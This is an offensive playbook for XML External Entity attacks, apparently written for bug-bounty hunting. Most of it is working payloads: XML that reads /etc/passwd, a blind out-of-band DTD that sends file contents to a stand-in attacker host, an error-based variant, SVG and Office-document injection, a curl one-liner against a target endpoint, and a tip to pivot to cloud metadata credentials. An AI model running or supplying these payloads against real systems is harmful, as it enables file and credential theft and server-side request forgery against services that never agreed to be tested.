# XXE — playbook

## when to try
- Endpoint accepts `Content-Type: application/xml`, `text/xml`, `application/soap+xml`.
- File-upload features that parse XML inside (DOCX, XLSX, SVG, PDF metadata).
- SAML / SOAP / WS-Security endpoints.
- Any service that says "import from XML/OPML/atom feed".

## key bypass tricks
- **Classic**: external entity to read local file:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
  ```
- **Blind XXE → OOB**: external DTD on your server:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://attacker/x.dtd"> %ext; ]>
  <r/>
  ```
  `x.dtd`:
  ```dtd
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % all "<!ENTITY exfil SYSTEM 'http://attacker/c?d=%file;'>">
  %all;
  ```
- **Param entity error-based**: force a parser error that includes the file:
  ```dtd
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY % error SYSTEM 'file:///nonexistent/%file;'>">
  %eval; %error;
  ```
- **SVG XXE**: upload an SVG with `<!DOCTYPE>` payload — many image-pipeline parsers (ImageMagick, librsvg) trigger.
- **Office docs**: unzip `.docx`/`.xlsx`, edit `[Content_Types].xml` or `word/document.xml`, repack.

## confirmation flow
1. Submit a normal XML body — confirm 2xx.
2. Add `<!DOCTYPE foo [ <!ENTITY x "TEST"> ]>` and reference `&x;` in a node — see if "TEST" appears in the response (in-band echo).
3. If echo: try `SYSTEM "file:///etc/hostname"` — file content in response = confirmed RCE-adjacent.
4. If no echo: blind path — out-of-band DTD as above. DNS+HTTP hit = confirmed.

## exploitation snippet
```bash
# In-band file read
curl -sk -X POST https://target/api/import -H 'Content-Type: application/xml' --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'

# Blind via OOB
python3 -m http.server 8080 &
# host x.dtd as above, target sends the body referencing it.
```

## caveats
- Modern parsers (libxml2 with `LIBXML_NONET` + `disable_external_entities`) reject all of this. Don't waste cycles if the stack is known-hardened (e.g. `defusedxml`).
- File reads on `/etc/passwd` may not impress triagers; pivot to AWS creds, app config, internal SSRF via `<!ENTITY xxe SYSTEM "http://169.254.169.254/...">`.
- SVG XXE often needs the SVG to be processed (resized, rasterized) — not just stored.

## provenance
- PortSwigger XXE lab family.
- Classic public reports: Facebook XXE → SSRF (2014), Uber SAML XXE.
